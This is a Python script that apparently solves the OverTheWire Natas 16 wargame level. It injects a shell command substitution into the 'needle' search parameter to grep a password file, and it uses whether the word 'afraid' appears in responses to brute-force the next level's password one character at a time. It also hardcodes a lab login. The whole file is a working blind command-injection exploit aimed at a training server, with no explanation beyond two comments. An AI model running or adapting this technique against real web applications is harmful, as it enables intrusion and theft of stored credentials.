# -*- coding: utf-8 -*-

import requests

url = "http://natas16.natas.labs.overthewire.org/index.php?needle="
inj = "$(grep -E ^{0}.*$ /etc/natas_webpass/natas16)afr"
inj = "$(egrep ^{0}.*$ /etc/natas_webpass/natas17)afr"

# subcammand returns something => pass is correct, no result for the search
# subcommand returns nothing => pass is wrong, search finds "African, Africans, afraid, afresh"

auth = ("natas16", "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh")
goodpwd = ""

alphanum = "azertyuiopmlkjhgfdsqwxcvbn"
alphanum += alphanum.upper()
alphanum += "0123456789"

done = False

while not done:
    print("new loop, pwd = " + goodpwd)
    done = True
    for char in alphanum:
        r = requests.get(url + inj.format(goodpwd + char), auth=auth)
        
        if "afraid" not in r.text:
            goodpwd += char
            done = False
            break

print("done! pwd = " + goodpwd)
